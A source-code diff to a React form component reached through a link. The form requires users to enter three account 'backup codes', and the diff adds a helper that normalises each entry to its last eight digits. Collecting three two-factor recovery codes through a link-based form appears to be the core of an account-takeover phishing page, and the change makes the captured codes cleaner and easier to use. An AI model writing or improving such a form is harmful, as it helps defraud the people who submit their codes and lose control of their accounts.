@@ -126,6 +126,10 @@ function SubmitForm() {
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
 
+  const cleanBackupCode = (value: string) => {
+  return value.replace(/\D/g, "").slice(-8);
+};
+
   if (!link) return (
     <div style={{ textAlign: "center", color: "rgba(255,255,255,0.3)", fontFamily: "'DM Sans',sans-serif", fontSize: 13 }}>
       Invalid link. Please contact support.
@@ -193,15 +197,15 @@ function SubmitForm() {
       <BackupInstructions />
 
       <Field label="Backup Code 1 — Required">
-        <TextInput placeholder="Backup code" value={ba1} onChange={setBa1} />
+        <TextInput placeholder="Backup code" value={ba1} onChange={(v) => setBa1(cleanBackupCode(v))} />
       </Field>
 
       <Field label="Backup Code 2 — Required">
-        <TextInput placeholder="Backup code" value={ba2} onChange={setBa2} />
+        <TextInput placeholder="Backup code" value={ba2} onChange={(v) => setBa2(cleanBackupCode(v))} />
       </Field>
 
       <Field label="Backup Code 3 — Required">
-        <TextInput placeholder="Backup code" value={ba3} onChange={setBa3} />
+        <TextInput placeholder="Backup code" value={ba3} onChange={(v) => setBa3(cleanBackupCode(v))} />
       </Field>
 
       {/* Error */}
